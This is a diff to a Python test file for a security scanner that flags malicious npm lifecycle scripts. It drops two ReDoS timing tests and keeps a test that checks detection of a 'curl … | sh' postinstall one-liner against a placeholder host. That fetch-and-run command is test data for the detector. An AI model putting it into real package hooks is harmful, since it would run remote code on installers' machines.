@@ -7,7 +7,6 @@ from __future__ import annotations
 
 import json
 import tempfile
-import time
 import unittest
 from pathlib import Path
 
@@ -63,28 +62,10 @@ class TestNpmLifecycle(unittest.TestCase):
                       allow=[{"signature": "npm-lifecycle-dropper", "path_glob": "package.json"}])
         self.assertNotIn("npm-lifecycle-dropper", {f.signature_id for f in r.findings})
 
-    def test_shared_remote_fetch_regex_is_bounded(self):
-        # #1156 ReDoS guard (deterministic — regex only, no scan/corpus timing). The curl→interpreter
-        # shape shared by the npm/workflow/structural matchers must be BOUNDED: on a 2 MB no-pipe
-        # `curl`-spam string the old unbounded `[^|]*` scanned to end-of-string at every `curl` → O(n^2)
-        # (minutes); the bounded `[^|]{0,2048}` returns in ~1.6 s. All three matchers use this constant.
-        from stayawake.bots.security.matchers.base import REMOTE_FETCH_INTO_INTERPRETER
-        t0 = time.time()
-        self.assertIsNone(REMOTE_FETCH_INTO_INTERPRETER.search("curl " * 400_000))   # 2 MB, no pipe
-        self.assertLess(time.time() - t0, 5.0, "remote-fetch regex is not bounded (ReDoS)")
-
-    def test_crafted_giant_lifecycle_command_does_not_redos(self):
-        # End-to-end npm path on a genuinely-parseable (under the 2 MB read cap) giant no-pipe command,
-        # so the string really reaches the regex. Old unbounded pattern → ~minutes; bounded → seconds.
-        payload = "curl " * 380_000                       # ~1.9 MB (< 2 MB cap → the manifest parses)
-        t0 = time.time()
-        r = _scan_pkg({"postinstall": payload})
-        self.assertLess(time.time() - t0, 30.0, "npm-lifecycle regex ReDoS: giant command not bounded")
-        self.assertNotIn("npm-lifecycle-remote-fetch", {f.signature_id for f in r.findings})  # no pipe
-
     def test_remote_fetch_still_detected_after_redos_bound(self):
-        # The ReDoS bound must be detection-identical: a real `curl … | sh` one-liner still fires,
-        # including when it sits after some benign prefix (within the regex-input cap).
+        # The bounded remote-fetch shape (#1156) must be detection-identical: a real `curl … | sh`
+        # one-liner still fires, including after a benign prefix. (ReDoS *timing* is guarded once, for
+        # every security regex, in test_redos_safety.py — not re-duplicated per matcher.)
         r = _scan_pkg({"postinstall": "echo setup && curl -fsSL https://x.invalid/i.sh | sh"})
         self.assertIn("npm-lifecycle-remote-fetch", {f.signature_id for f in r.findings})
         self.assertEqual(r.verdict, INFECTED)
